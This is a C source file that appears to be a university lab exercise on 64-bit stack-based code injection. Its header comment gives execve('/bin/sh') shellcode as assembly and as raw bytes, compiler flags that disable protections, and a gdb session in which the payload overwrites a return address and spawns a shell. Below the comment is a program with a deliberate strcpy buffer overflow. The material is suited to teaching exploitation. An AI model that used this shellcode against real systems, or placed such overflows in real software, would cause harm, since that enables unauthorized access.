/*
 * Code Injection (64-bit) 
 * (c) Elias Athanasopoulos,  athanasopoulos.elias@ucy.ac.cy
 *
 * Compile the attached C program.
 * $ gcc -Wall -no-pie -fno-pic -z execstack stack-smash2.c -o stack-smash2
 *
 * Compile the shellcode:
 * .section .data
 * .section .text
 * .globl _start
 *
 * _start:
 *  xor     %rax,%rax
 *  pushq   %rax                        # push \0
 *  xor     %rsi,%rsi
 *  xor     %rdx,%rdx
 *  mov     $0x3b,%al
 *  mov     $0x68732f2f6e69622f,%r9     # /bin//sh
 *  pushq   %r9
 *  mov     %rsp,%rdi
 *  syscall 
 * 
 * $ as shellcode.s -o shellcode.o
 *
 * Inspect the shellcode:
 * 
 * $ objdump -d ./shellcode.o
 *
 * Disassembly of section .text:
 * 
 * 0000000000000000 <_start>:
 *  0:   48 31 c0                xor    %rax,%rax
 *  3:   50                      push   %rax
 *  4:   48 31 f6                xor    %rsi,%rsi
 *  7:   48 31 d2                xor    %rdx,%rdx
 *  a:   b0 3b                   mov    $0x3b,%al
 *  c:   49 b9 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%r9 
 * 13:   2f 73 68
 * 16:   41 51                   push   %r9
 * 18:   48 89 e7                mov    %rsp,%rdi
 * 1b:   0f 05                   syscall
 *
 * The shellcode is:
 * \x48\x31\xc0\x50\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x49\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x41\x51\x48\x89\xe7\x0f\x05
 *
 * Repeat the steps in stack-smash0.c using this program (do not forget the -z
 * execstack option), the shellcode and gdb in order to spawn a shell in the
 * vulnerable program.
 *
 * Example stack snapshot (return address is noted with '*'):
 * (gdb) r `printf "A\x48\x31\xc0\x50\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x49\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x41\x51\x48\x89\xe7\x0f\x05AAAAAAAAAA\xb0\xdf\xff\xff\xff\x7f"`
 * Starting program: /home/elathan/src/epl326-src/x86-64/code-injection/stack-smash2 `printf "A\x48\x31\xc0\x50\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x49\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x41\x51\x48\x89\xe7\x0f\x05AAAAAAAAAA\xb0\xdf\xff\xff\xff\x7f"`
 * [Thread debugging using libthread_db enabled]
 * Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 * 
 * Breakpoint 1, 0x000000000040115a in authenticate_root ()
 * (gdb) ni 10
 * 0x0000000000401185 in authenticate_root ()
 * (gdb) x/16gx $rbp-32
 * 0x7fffffffdf00: 0xf6314850c0314841      0x2fb9493bb0d23148
 * 0x7fffffffdf10: 0x4168732f2f6e6962      0x4141050fe7894851
 * 0x7fffffffdf20: 0x4141414141414141     *0x00007fffffffdf01
 * 0x7fffffffdf30: 0x00007fffffffe058      0x00000002f7ffdad0
 * 0x7fffffffdf40: 0x0000000000000002      0x00007ffff7dff24a
 * 0x7fffffffdf50: 0x00007fffffffe040      0x00000000004011da
 * 0x7fffffffdf60: 0x0000000200400040      0x00007fffffffe058
 * 0x7fffffffdf70: 0x00007fffffffe058      0x2bd2e7ed3f7dbece
 * (gdb) c
 * Continuing.
 * 0x7fffffffdf18
 * Validating password: AH1�PH1�H1Ұ;I�/bin//shAQH��AAAAAAAAAA����
 * process 7593 is executing new program: /usr/bin/dash
 * Error in re-setting breakpoint 1: Function "authenticate_root" not defined.
 * [Thread debugging using libthread_db enabled]
 * Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 * $
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int password_valid = 0;

void authenticate_root(char *passwd) {
	unsigned long marker = 0xdeadbeef;
	char password[16];

	strcpy(password, passwd);

	fprintf(stderr, "%p\n", &marker);
	fprintf(stderr, "Validating password: %s\n", password);

	if (!strcmp(password, "e5ce4db216329f4f")) 
		password_valid = marker;

}

int main(int argc, char *argv[]) {

	authenticate_root(argv[1]);

	if (password_valid != 0) {
		printf("Welcome administrator.\n");
	} else {
		printf("Access denied.\n");
	}

	return 1;
}
